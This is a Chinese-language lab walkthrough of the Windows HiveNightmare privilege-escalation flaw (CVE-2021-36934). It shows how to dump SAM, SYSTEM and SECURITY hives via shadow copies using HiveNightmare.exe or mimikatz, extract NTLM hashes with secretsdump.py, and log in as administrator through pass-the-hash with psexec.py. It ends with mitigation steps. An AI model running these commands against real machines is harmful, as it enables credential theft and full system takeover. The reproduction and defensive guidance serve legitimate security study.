0x00 前言据微软官方通报，由于对多个系统文件（包括安全帐户管理器 (SAM) 数据库）的访问控制列表 (ACL) 过于宽松，导致存在特权提升漏洞。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新帐户。本漏洞需要目标系统开启系统保护，并已经存在系统还原点方可利用。影响范围：

Windows Server, version 20H2 (Server Core Installation)
Windows Server, version 2004 (Server Core installation)
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for 32-bit Systems

0x01 环境介绍

靶机：windows 10 version 1909（192.168.245.135）普通本地用户：ceshi

0x02 配置环境

2.1 靶机开启系统保护

2.2 下载exe工具

下载地址：https://github.com/GossiTheDog/HiveNightmare/releases

2.3、kali安装impack套件

下载地址：https://github.com/cube0x0/impacket

cd impacket-master 
python3 ./setup.py install

下载地址：https://github.com/gentilkiwi/mimikatz/releases

0x03 方法一（利用HiveNightmare.exe）

3.1 导出hash文件

利用HiveNightmare.exe导出hash文件

3.2 读取sam文件中的hash

将三个文件拷贝到kali中，通过impacket套件中的secretsdump.py脚本读取hash

python3 secretsdump.py -system ../../CVE-2021-36934/SYSTEM-2021-07-23 -security ../../CVE-2021-36934/SECURITY-2021-07-23 -sam ../../CVE-2021-36934/SAM-2021-07-23 local

文件路径修改为对应路径

3.3 pth登录

利用impacket套件中的psexec.py脚本使用administrator的hash横向登录靶机：

python3 psexec.py -hashes:456d4a076ac1fbdf96c97d3f250dede9 administrator@192.168.245.135 cmd

0x04 方法二（利用mimikatz.exe）

4.1 查看所有用户属性

mimikatz # token::whoami /full

4.2 导出shadowcopy volume

mimikatz # misc::shadowcopies

4.3 读取hash

mimikatz # lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

4.4 pth登录

python3 psexec.py -hashes :456d4a076ac1fbdf96c97d3f250dede9 administrator@192.168.245.135 cmd

0x05 修复建议

1、该漏洞暂无安全补丁。2、临时解决方案：

(1) 限制对 %windir%\system32\config 内容的访问： 以管理员身份打开命令提示符或 Windows PowerShell，运行此命令：icacls %windir%\system32\config*.* /inheritance:e。

(2) 删除卷影复制服务 (VSS) 卷影副本：      删除限制访问 %windir%\system32\config 之前存在的任何系统还原点和卷影卷。     创建一个新的系统还原点（如果需要）。

注意：删除卷影副本可能会影响还原操作，包括使用第三方备份应用程序还原数据的能力；必须限制访问并删除卷影副本以防止利用此漏洞。
